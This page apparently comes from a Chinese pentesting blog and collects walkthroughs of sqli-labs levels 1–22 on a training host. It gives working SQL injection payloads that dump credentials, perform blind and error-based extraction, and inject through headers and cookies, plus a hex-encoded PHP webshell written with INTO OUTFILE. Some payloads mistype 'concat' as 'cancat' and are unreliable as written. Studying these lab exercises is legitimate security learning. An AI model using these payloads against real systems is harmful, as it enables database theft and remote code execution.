@@ -1,0 +1,268 @@
+<!doctype html>
+<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="robots" content="noindex"><meta><title>分类: train - toBePenTester</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="toBePenTester"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="toBePenTester"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="cyhfvg&amp;#39;s Blog."><meta property="og:type" content="blog"><meta property="og:title" content="toBePenTester"><meta property="og:url" content="https://cyhfvg.github.io/"><meta property="og:site_name" content="toBePenTester"><meta property="og:description" content="cyhfvg&amp;#39;s Blog."><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://cyhfvg.github.io/img/og_image.png"><meta property="article:author" content="cyhfvg"><meta property="article:tag" content="cyhfvg blog"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://cyhfvg.github.io"},"headline":"toBePenTester","image":["https://cyhfvg.github.io/img/og_image.png"],"author":{"@type":"Person","name":"cyhfvg"},"publisher":{"@type":"Organization","name":"toBePenTester","logo":{"@type":"ImageObject","url":{"text":"I wanna be the guy."}}},"description":"cyhfvg&#39;s Blog."}</script><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><meta name="generator" content="Hexo 5.4.2"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">I wanna be the guy.</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/cyhfvg"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><div class="card"><div class="card-content"><nav class="breadcrumb" aria-label="breadcrumbs"><ul><li><a href="/categories">分类</a></li><li><a href="/categories/penetration-Test/">penetration Test</a></li><li class="is-active"><a href="#" aria-current="page">train</a></li></ul></nav></div></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2022-01-09T10:30:21.000Z" title="1/9/2022, 6:30:21 PM">2022-01-09</time>发表</span><span class="level-item"><time dateTime="2022-01-09T10:30:21.000Z" title="1/9/2022, 6:30:21 PM">2022-01-09</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/penetration-Test/">penetration Test</a><span> / </span><a class="link-muted" href="/categories/penetration-Test/train/">train</a></span><span class="level-item">5 分钟读完 (大约775个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/something-about-sqliLabs-0x03/">something about sqliLabs 0x03</a></h1><div class="content"><h1 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h1><p><a target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs">sqli-labs</a>    =&gt; <a target="_blank" rel="noopener" href="https://github.com/to-be-the-one/sqli-labs">备份地址</a></p>
+<h2 id="Page-1-Basic-Challenges"><a href="#Page-1-Basic-Challenges" class="headerlink" title="Page-1(Basic Challenges)"></a>Page-1(Basic Challenges)</h2><h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><blockquote>
+<p>POST - Error Based - Single quotes - String</p>
+</blockquote>
+<p>提交方式为<code>POST</code>方式，直接构造<code>post请求</code>。<br>
+<code>uname=username&amp;passwd=password&#39;+or+true+--+&amp;submit=Submit</code>或
+<code>uname=username&amp;passwd=password&#39;+or+true+--+&amp;submit=Submit</code>都可，两处都可注入。</p>
+<h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3><blockquote>
+<p>POST - Error Based - Double quotes - String - with twist</p>
+</blockquote>
+<p>多试几次，发现闭合方式不同，双引号与括号闭合<code>(&quot;$id&quot;)</code>。<br>
+<code>uname=username&quot;)+or+true+--+&amp;passwd=password&amp;submit=Submit</code>或
+<code>uname=username&amp;passwd=password&quot;)+or+true+--+&amp;submit=Submit</code>都可，两处都可注入。</p>
+<h3 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h3><blockquote>
+<p>POST - Double Injection - Single quotes - String - with twist</p>
+</blockquote>
+<p>闭合方式为<code>(&#39;$password&#39;)</code>。<br>
+<code>uname=username&#39;)+or+true+--+&amp;passwd=password&amp;submit=Submit</code>或
+<code>uname=username&amp;passwd=password&#39;)+or+true+--+&amp;submit=Submit</code>两处都可注入。</p>
+<h3 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h3><blockquote>
+<p>POST - Double Injection - Double quotes - String - with twist</p>
+</blockquote>
+<p>闭合方式为<code>&quot;$password&quot;</code>。<br>
+<code>uname=username&quot;+or+true+--+&amp;passwd=password&amp;submit=Submit</code>或
+<code>uname=username&amp;passwd=password&quot;+or+true+--+&amp;submit=Submit</code>两处都可注入。</p>
+<h3 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h3><blockquote>
+<p>POST - Blind - Boolean/Time Based - Single quotes</p>
+</blockquote>
+<p><code>uname=username&#39;+or+true+--+&amp;passwd=password&amp;submit=Submit</code>或
+<code>uname=username&amp;passwd=password&#39;+or+true+--+&amp;submit=Submit</code>两处都可注入。</p>
+<h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><blockquote>
+<p>POST - Blind - Boolean/Time Based - Double quotes</p>
+</blockquote>
+<p><code>uname=username&quot;)+or+true+--+&amp;passwd=password&amp;submit=Submit</code>或
+<code>uname=username&amp;passwd=password&quot;)+or+true+--+&amp;submit=Submit</code>都可以注入。</p>
+<h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><blockquote>
+<p>POST - Update Query - Error Based - String</p>
+</blockquote>
+<p>这不是普通的<code>select</code>语句，而是<code>update</code>语句，可以利用<a href="/something-about-sqliLabs-0x01/" title="0x01">0x01</a>中学到的<code>updatexml()</code>,<code>extractvalue()</code>报错来获取信息。</p>
+<p><code>uname=Dumb&amp;passwd=newpassword&#39;+or+updatexml(1,concat(0x7e,database()),1)+or+&#39;close&amp;submit=Submit</code>即可成功注入，并获得了<code>database()</code>信息。</p>
+<h3 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h3><blockquote>
+<p>POST - Header Injection - Uagent field - Error based</p>
+</blockquote>
+<p>需要注入<code>HTTP头</code>，由于这次查询，先查询<code>用户</code>/<code>密码</code>是否存在，如果存在，将其
+<code>User-Agent</code> 存入数据库中。</p>
+<p>注入<code>HTTP头</code>的<code>User-Agent</code>属性。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Less-18/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>train.com</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>test&#x27; or updatexml(1,concat(0x7e, database()) ,1) or &#x27;close</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-dts"><span class="attr">uname</span><span class="operator">=</span>admin<span class="variable">&amp;passwd</span>=admin<span class="variable">&amp;submit</span>=Submit</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h3><blockquote>
+<p>POST - Header Injection - Referer field - Error based</p>
+</blockquote>
+<p>注入<code>HTTP头</code>的<code>Referer</code>属性，此属性是用来标识，请求来源于哪个<code>URL</code>。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Less-19/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">...</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,en-US;q=0.7,en;q=0.3</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>close&#x27; or updatexml(1,concat(0x7e, database()) ,1) or &#x27;close</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="language-dts"><span class="attr">uname</span><span class="operator">=</span>admin<span class="variable">&amp;passwd</span>=admin<span class="variable">&amp;submit</span>=Submit</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h3><blockquote>
+<p>POST - Cookie Injections - Uagent field - Error based</p>
+</blockquote>
+<p>对<code>HTTP头</code>的<code>Cookie</code>属性进行注入。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Less-20/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>train.com</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>uname=admin&#x27; or updatexml(1, concat(0x7e, database()),1) or &#x27;close; ZDEDebuggerPresent=php,phtml,php3</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-dts"><span class="attr">uname</span><span class="operator">=</span>admin<span class="variable">&amp;passwd</span>=admin<span class="variable">&amp;submit</span>=Submit</span></span><br></pre></td></tr></table></figure>
+
+<p>跟隨<code>redirection</code>，即可以看到结果。</p>
+<h3 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h3><blockquote>
+<p>POST - Cookie Injections - Uagent field - Error based</p>
+</blockquote>
+<p>与 <strong>Less-20</strong> 相同，但是观察到<code>uname = YWRtaW4=</code>中是有<code>=</code>存在的，联想到
+<code>BASE64</code>编码后，会出现<code>=</code>补足编码。</p>
+<p>使用<code>base64</code>工具解码查看：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~$ <span class="built_in">echo</span> <span class="string">&quot;YWRtaW4=&quot;</span> | <span class="built_in">base64</span> -d -</span><br><span class="line">admin</span><br></pre></td></tr></table></figure>
+
+<p>与请求内容吻合，因此构造好<code>payload</code>后还需要进行<code>BASE64</code>编码。<br>
+构造payload为<code>admin&#39; or updatexml(1, concat(0x7e, database()),1) or &#39;close</code>。<br></p>
+<p>使用<code>base64</code>工具编码:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~$ <span class="built_in">echo</span> <span class="string">&quot;admin&#x27; or updatexml(1, concat(0x7e, database()),1) or &#x27;close&quot;</span> | <span class="built_in">base64</span> -</span><br><span class="line">YWRtaW4nIG9yIHVwZGF0ZXhtbCgxLCBjb25jYXQoMHg3ZSwgZGF0YWJhc2UoKSksMSkgb3IgJ2Nsb3NlCg==</span><br></pre></td></tr></table></figure>
+
+<p>最终payload为:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/Less-21/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">...</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>uname=YWRtaW4nIG9yIHVwZGF0ZXhtbCgxLCBjb25jYXQoMHg3ZSwgZGF0YWJhc2UoKSksMSkgb3IgJ2Nsb3NlCg%3d%3d; ZDEDebuggerPresent=php,phtml,php3</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure>
+
+<h3 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h3><blockquote>
+<p>POST - Cookie Injections - Uagent field - Error based</p>
+</blockquote>
+<p>与 <strong>Less-21</strong> 相比，闭合方式为<code>&quot;</code>，其他相同。</p>
+</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/sql-injection/">sql injection, </a><a class="link-muted" rel="tag" href="/tags/sqli-labs/">sqli-labs </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2022-01-06T13:43:13.000Z" title="1/6/2022, 9:43:13 PM">2022-01-06</time>发表</span><span class="level-item"><time dateTime="2022-01-06T13:43:13.000Z" title="1/6/2022, 9:43:13 PM">2022-01-06</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/penetration-Test/">penetration Test</a><span> / </span><a class="link-muted" href="/categories/penetration-Test/train/">train</a></span><span class="level-item">3 分钟读完 (大约464个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/something-about-sqliLabs-0x02/">something about sqliLabs 0x02</a></h1><div class="content"><h1 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h1><p><a target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs">sqli-labs</a>    =&gt; <a target="_blank" rel="noopener" href="https://github.com/to-be-the-one/sqli-labs">备份地址</a></p>
+<h2 id="Page-1-Basic-Challenges"><a href="#Page-1-Basic-Challenges" class="headerlink" title="Page-1(Basic Challenges)"></a>Page-1(Basic Challenges)</h2><h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><blockquote>
+<p>Get - Double Injection - Double Quotes - String</p>
+</blockquote>
+<p>大致与<a href="/something-about-sqliLabs-0x01/" title="Less-5">Less-5</a>相同，不同之处为闭合符号为双引号(<code>&quot;</code>)。</p>
+<h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><blockquote>
+<p>Get - Dump into outfile - String</p>
+</blockquote>
+<p>构造输出文件，输出<code>webshell</code>，<br>
+<code>?id=1&#39;))+and+false+union+select+null,0x3c3f706870206576616c28245f4745545b27636d64275d29203f3e,null+from+dual+into+outfile+&#39;C:\\wwwroot\\sqliLabs\\Less-4&#39;+--+</code>。</p>
+<p>此种漏洞条件比较苛刻，需要<code>mysql</code>配置可以写入文件,需要知道绝对路径等等。<br></p>
+<p>其中<code>0x3c3f706870206576616c28245f4745545b27636d64275d29203f3e</code>是<code>&lt;?php eval($_GET[&#39;cmd&#39;])?&gt;</code>的hex编码形式。
+关于<code>hex编码</code>可以使用<code>vim</code>组件的<code>xxd</code>。</p>
+<h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3><blockquote>
+<p>GET - Blind - Boolean Based - Single Quotes</p>
+</blockquote>
+<p>基于布尔的盲注,注入后，页面不会显示对应内容。<br></p>
+<p>注入<code>?id=1&#39;+and+false+--+</code>与<code>?id=1&#39;+or+true+--+</code>，发现页面响应内容不同,因此可以确认注入点。</p>
+<p>确认注入点后，通过<code>?id=1&#39;+and+(length(database())+&lt;+20)+--+</code>获得数据库长度，
+通过<code>?id=1&#39;+and+(ascii(substr(database(),1,1))&gt;ascii(&#39;m&#39;))+--+</code>等可以确定数据库的名字。</p>
+<p>通过<code>?id=1&#39;+and+(length((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+0,1))+&lt;+20)+--+</code>等
+获得数据表的长度,<code>id=1&#39;+and+(ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+0,1),1,1))+&lt;+ascii(&#39;m&#39;))+--+</code>等
+确定数据表的名字。</p>
+<h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><blockquote>
+<p>GET - Blind - Time Based - Single Quotes</p>
+</blockquote>
+<p>基于时间的盲注，注入后，页面不会显示对应内容。<br></p>
+<p>注入<code>?id=1&#39;+or+true+--+</code>与<code>?id=1&#39;+and+sleep(5)+--+</code>，发现页面响应时间明显不同，因此可以确认注入点。<br></p>
+<p>通过与<a href="###Less-8">Less-8</a>相似的注入技巧,可以获取敏感信息。</p>
+<p>例:<br>
+<code>?id=1&#39;+and+(ascii(substr(database(),1,1))&lt;ascii(&#39;m&#39;))+and+sleep(5)+--+</code></p>
+<h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><blockquote>
+<p>GET - Blind - Time Based - Double Quotes</p>
+</blockquote>
+<p>通过<code>?id=1&#39;+and+sleep(5)+--+</code>与<code>?id=1&quot;+and+sleep(5)+--+</code>页面响应时间明显不同，可以确定闭合方式为<code>&quot;</code>，
+其它与<a href="###Less-9">Less-9</a>相同。</p>
+</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/sql-injection/">sql injection, </a><a class="link-muted" rel="tag" href="/tags/sqli-labs/">sqli-labs </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2022-01-03T12:20:00.000Z" title="1/3/2022, 8:20:00 PM">2022-01-03</time>发表</span><span class="level-item"><time dateTime="2022-01-03T12:20:00.000Z" title="1/3/2022, 8:20:00 PM">2022-01-03</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/penetration-Test/">penetration Test</a><span> / </span><a class="link-muted" href="/categories/penetration-Test/train/">train</a></span><span class="level-item">7 分钟读完 (大约1002个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/something-about-sqliLabs-0x01/">something about sqliLabs 0x01</a></h1><div class="content"><h1 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h1><p><a target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs">sqli-labs</a>    =&gt; <a target="_blank" rel="noopener" href="https://github.com/to-be-the-one/sqli-labs">备份地址</a></p>
+<h2 id="Page-1-Basic-Challenges"><a href="#Page-1-Basic-Challenges" class="headerlink" title="Page-1(Basic Challenges)"></a>Page-1(Basic Challenges)</h2><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><blockquote>
+<p>Get - Error based - Single quotes - String<br></p>
+</blockquote>
+<blockquote>
+<p><code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code></p>
+</blockquote>
+<p>注入点是<code>id</code>，正常<code>url</code>为<code>http://train.com/Less-1/?id=1</code>。</p>
+<p>注入<code>id=10&#39;or+true</code>，会有报错信息(多余<code>&#39;</code>)，重新注入<code>id=10&#39;or+true%23</code>，<code>%23</code>为<code>#</code>,
+注释掉尾部的剩余<code>sql语句</code>。</p>
+<ul>
+<li><p>确认显示列</p>
+<p>  注入<code>?id=1&#39;+and+false+union+select+1,2,3+--+</code>，页面上显示<code>2,3</code>，因此显示列为第2列与第3列。</p>
+</li>
+<li><p>获取敏感信息</p>
+<p>  利用获取的显示列，构造sql，将敏感信息放置在第2列与第3列中显示在页面上。<br></p>
+<p>  注入<code>?id=1&#39;+and+false+union+select+1,version(),database()+--+</code>，可以获得数据库版本号
+  与数据库名。<br></p>
+<ul>
+<li><p>获取数据库名</p>
+<p>  注入<code>?id=1&#39;+and+false+union+select+1,(select+group_concat(schema_name)+from+information_schema.schemata),database()+--+</code>，
+  可以获得当前数据库用户 <strong>所有数据库</strong> (从<code>information_schema</code>库的<code>schemata</code>表中拼接<code>schema_name</code>获得)。<br></p>
+</li>
+<li><p>获取数据表名</p>
+<p>  获取库名的状态下，可以根据目标库名，获取表名。<br>
+  <code>?id=1&#39;+and+false+union+select+1,(select+group_concat(table_name)+from+information_schema.tables+where table_schema=&#39;security&#39;),database()+--+</code>，
+  可以获得目标数据库的所有表名(从<code>information_schema</code>库的<code>tables</code>表中拼接<code>table_name</code>获得)。</p>
+</li>
+<li><p>获取列名</p>
+<p>  获取表名的状态下，可以根据目标表名，获取对应的字段名。<br>
+  <code>?id=1&#39;+and+false+union+select+1,(select+group_concat(column_name)+from+information_schema.columns+where table_name=&#39;users&#39;),database()+--+</code>，
+  可以获得目标表的所有字段名(从<code>information_schema</code>库的<code>columns</code>表中拼接<code>column_name</code>获得)。</p>
+</li>
+<li><p>获取关心信息</p>
+<p>  获取字段名后，还有什么是获取不到的呢？<br>
+  <code>?id=1&#39;+and+false+union+select+1,(select+group_concat(username)+from+security.users),(select+group_concat(password)+from+security.users)+--+</code>，
+  可以获得所有用户的用户名及其对应的密码。</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><blockquote>
+<p>Get - Error based - Integer based</p>
+</blockquote>
+<blockquote>
+<p><code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code></p>
+</blockquote>
+<p><a href="#Less-1">与Less-1相同</a></p>
+<h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><blockquote>
+<p>Get - Error based - Single quotes with twist - String</p>
+</blockquote>
+<blockquote>
+<p><code>$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code></p>
+</blockquote>
+<p>相比<code>Less-1</code>，还需要闭合括号<code>()</code>，其它与<a href="#Less-1">Less-1</a>相同。</p>
+<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><blockquote>
+<p>Get - Error based - Double quotes - String</p>
+</blockquote>
+<blockquote>
+<p><code>$id = &#39;&quot;&#39; . $id . &#39;&quot;&#39;;</code><br>
+<code>$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</code></p>
+</blockquote>
+<p>此次以<code>&quot;</code>(双引号)包裹参数，因此尝试闭合<code>&quot;</code>。<br></p>
+<p>实际上当尝试注入<code>id=1&#39;+and+false+--+</code>，却返回结果时，就应该考虑更换闭合方式。<br></p>
+<p>成功闭合后，即与<a href="#Less-1">Less-1</a>相同。</p>
+<h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><blockquote>
+<p>Get - Double Injection - Single quotes - String</p>
+</blockquote>
+<blockquote>
+<p><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p>
+</blockquote>
+<p>实际尝试后，注入<code>?id=1&#39;+and+false+--+</code>与<code>?id=1&#39;+or+true+--+</code>页面反应不同样，即标志着确实有注入点。<br></p>
+<p>只是，页面没有显示信息，如何获取信息呢？<br>
+并非没有办法。此处sql语句错误时，会输出错误信息，因此恶意构造sql语句，将关心信息藏在
+报错输出中。<br></p>
+<ul>
+<li><p>Duplicate entry</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span></span><br><span class="line">(</span><br><span class="line">    <span class="keyword">select</span> <span class="number">1</span>                           <span class="comment">-- 检索y的值(1)</span></span><br><span class="line">    <span class="keyword">from</span> (                             <span class="comment">-- 括号必需</span></span><br><span class="line">        <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>)</span><br><span class="line">            ,concat(                   <span class="comment">-- 利用 concat函数拼接内容,起别名为x</span></span><br><span class="line">                <span class="number">0x23</span>                   <span class="comment">-- 拼接#符号,分隔信息</span></span><br><span class="line">                ,($PAYLOAD)            <span class="comment">-- payload</span></span><br><span class="line">                ,<span class="number">0x23</span></span><br><span class="line">                ,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)      <span class="comment">-- floor函数与count(*)，group by,结合使用来报错</span></span><br><span class="line">                ) <span class="keyword">as</span> x</span><br><span class="line">        <span class="keyword">from</span> information_schema.tables</span><br><span class="line">        <span class="keyword">group</span> <span class="keyword">by</span> x                     <span class="comment">-- floor产生的0/1序列，group by 时会报错</span></span><br><span class="line">    ) <span class="keyword">as</span> y</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>  使用公式<code>and+(+select+1+from+(+select+count(*)+,concat(0x23,($PAYLOAD),0x23,floor(rand(0)*2))as+x+from+information_schema.tables+group+by+x+)as+y+)+--+</code>,<br>
+  构造payload，<code>?id=100&#39;+and+(+select+1+from+(+select+count(*)+,concat(0x23,(select+database()),0x23,floor(rand(0)*2))as+x+from+information_schema.tables+group+by+x+)as+y+)+--+</code>。</p>
+</li>
+<li><p>updatexml报错</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span></span><br><span class="line">(                        <span class="comment">-- 括号必需</span></span><br><span class="line">    updatexml(<span class="number">1</span></span><br><span class="line">        ,concat($PAYLOAD <span class="comment">-- ~(0x7e)是非法字符，一定会报错</span></span><br><span class="line">            ,<span class="number">0x7e</span>)</span><br><span class="line">        ,<span class="number">1</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>  <code>updatexml(XML_document, XPath_string, new_value)</code>，当<code>XPath_string</code>格式出现错误时，mysql会报语法错误。</p>
+<p>  使用公式，<code>and+(updatexml(1,cancat(database(),0x7e),1))+--+</code>,
+  构造payload，<code>?id=99&#39;+and+(updatexml(1,cancat(database(),0x7e),1))+--+</code>。</p>
+</li>
+<li><p>extractvalue报错</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span></span><br><span class="line">(                       <span class="comment">-- 括号必需</span></span><br><span class="line">    extractvalue(<span class="number">1</span>,</span><br><span class="line">        cancat($PAYLOAD</span><br><span class="line">        ,<span class="number">0x7e</span>)</span><br><span class="line">    )</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>  <code>extractvalue(XML_document, XPath_string)</code>,与<code>updatexml()</code>函数相同，当<code>XPath_string</code>格式出现错误时，mysql会报语法错误。</p>
+<p>  使用公式<code>and+(extractvalue(1,cancat($PAYLOAD,0x7e)))+--+</code>,构造payload，<code>?id=99&#39;+and+(extractvalue(1,cancat(database(),0x7e)))+--+</code>。</p>
+</li>
+</ul>
